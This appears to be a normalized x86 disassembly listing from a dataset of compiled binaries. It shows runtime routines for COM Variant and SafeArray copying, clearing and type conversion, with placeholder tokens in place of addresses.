call sub_4039a8
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40edbc
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403f90
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
jmp r-xdata
dec eax
je r-xdata
call sub_40e93c
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
jmp r-xdata
jmp r-xdata
call sub_40ea2c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b0b0
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
jmp r-xdata
jmp r-xdata
sub_40edd0
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e990
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40ea80
jmp r-xdata
jmp r-xdata
call sub_40eb70
sub_40ee04
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40281c
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
call sub_40281c
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40edd0
pop esi
pop ebx
retn
call sub_40281c
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40edd0
jmp r-xdata
call sub_40285c
mov edx eax
mov eax edx
call sub_4039a8
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40edd0
jmp r-xdata
pop esi
pop ebx
retn
sub_40ee88
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eed2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eed9
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40eef0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ef20
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ef20
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ef7c
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40edc4
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40edc4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40eef0
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40edc4
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40edc4
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40ef20
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40edc4
mov eax [ ebp - 0x314 ]
call sub_40f174
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f0f8
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40edc4
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403f6c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_415800
test al al
je r-xdata
mov eax ebx
call sub_40ef7c
jmp r-xdata
push ebx
call VariantClear
call sub_40edc4
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f190
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f1c0
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f1c0
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f21c
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40edc4
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40edc4
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f174
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40eb1c
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40edc4
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40edc4
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f190
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f1c0
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40edc4
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40edc4
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f3f0
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f0f8
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40edc4
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403fc0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_415800
test al al
je r-xdata
mov ecx sub_40f3e8
mov edx esi
mov eax ebx
call sub_40f21c
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40edc4
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f49c
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f3f0
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f0f8
sub_40f4e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp ebx esi
je r-xdata
push esi
push ebx
call VariantCopyInd
call sub_40edc4
pop esi
pop ebx
retn
mov eax ebx
call sub_40f174
sub_40f510
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov edx esp
mov ax [ ebx ]
call sub_415800
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f4e0
push 0x1
mov ecx ebx
mov edx esi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_40f544
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f70d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
and edx 0xffffbfff
cmp edx 0x14
ja r-xdata
test ah 0x20
je r-xdata
jmp [ edx * 4 + jump_table_40f579 ]
mov edx ebx
mov eax esi
call sub_40f510
mov ecx sub_40f508
mov edx ebx
mov eax esi
call sub_40f21c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movsx edx [ edx ]
mov cl 0xfe
call sub_41357c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov cl 0xfc
call sub_41357c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_413774
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_413774
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
mov eax esi
call sub_41379c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_413774
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40f500
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41382c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov dx [ edx ]
neg dx
sbb edx edx
neg edx
call sub_41374c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movsx edx [ edx ]
mov cl 0xff
call sub_41357c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movzx edx [ edx ]
mov cl 0x1
call sub_41357c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movzx edx [ edx ]
mov cl 0x2
call sub_41357c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov cl 0x4
call sub_41357c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
push eax
mov eax esi
call sub_413678
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f71c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f4e0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f714
lea eax [ ebp - 0x4 ]
call sub_404678
retn
sub_40f730
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x8 ]
call sub_404d94
mov esi eax
mov eax ebx
call sub_40f174
mov [ ebx ] 0x8
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40f758
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f7b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f49c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f9e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f7bb
lea eax [ ebp - 0x10 ]
call sub_40f174
retn
sub_40f7c4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f802
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412e2c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41382c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f809
lea eax [ ebp - 0x4 ]
call sub_404678
retn
sub_40f810
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f84e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412704
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4137b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f855
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40f85c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f89a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4134d0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f8a1
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_40f8a8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f8e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413404
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f8ed
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_40f8f4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f9e0
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40edd0
jmp r-xdata
mov edx esi
call sub_40e990
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40edd0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f974
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_415800
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f758
jmp r-xdata
mov edx esp
mov eax esi
call sub_415800
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f8f4
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f9e0
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f49c
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f9e0
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fa25 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f810
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40eedc
jmp r-xdata
mov eax ebx
call sub_41034c
mov edx eax
mov eax esi
call sub_413658
jmp r-xdata
mov eax ebx
call sub_40fda4
mov edx eax
mov eax esi
call sub_4135b8
jmp r-xdata
mov eax ebx
call sub_411710
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_4136a4
jmp r-xdata
mov eax ebx
call sub_411378
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4136c8
jmp r-xdata
mov eax ebx
call sub_412050
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_4136f4
jmp r-xdata
mov eax ebx
call sub_411ae8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413720
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f7c4
jmp r-xdata
mov eax ebx
call sub_410e64
mov edx eax
mov eax esi
call sub_41374c
jmp r-xdata
mov eax ebx
call sub_4101f4
mov edx eax
mov eax esi
call sub_413638
jmp r-xdata
mov eax ebx
call sub_4102a4
mov edx eax
mov eax esi
call sub_4135d8
jmp r-xdata
mov eax ebx
call sub_410444
mov edx eax
mov eax esi
call sub_4135f8
jmp r-xdata
mov eax ebx
call sub_41051c
mov edx eax
mov eax esi
call sub_413618
jmp r-xdata
mov eax ebx
call sub_410868
push edx
push eax
mov eax esi
call sub_413678
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f85c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f8a8
jmp r-xdata
mov dx 0x101
call sub_40e990
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f174
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f974
xor edx edx
mov ax 0x1
call sub_40e990
jmp r-xdata
sub_40fc0c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fcaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412e2c
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4041f4
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_4083d0
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fcb6
lea eax [ ebp - 0xc ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
call sub_404678
retn
mov eax ebx
call sub_410e64
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40edd0
jmp r-xdata
sub_40fcc0
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40edd0
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40fcfc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fd50
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f49c
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40fda4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fd57
lea eax [ ebp - 0x14 ]
call sub_40f174
retn
sub_40fd60
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415800
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40fda4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4101c5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fdd7 ]
mov eax [ ebp - 0x4 ]
call sub_40fc0c
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_4029ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029ec
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fc0c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fda4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fcc0
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fcfc
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e990
mov [ ebp - 0x8 ] eax
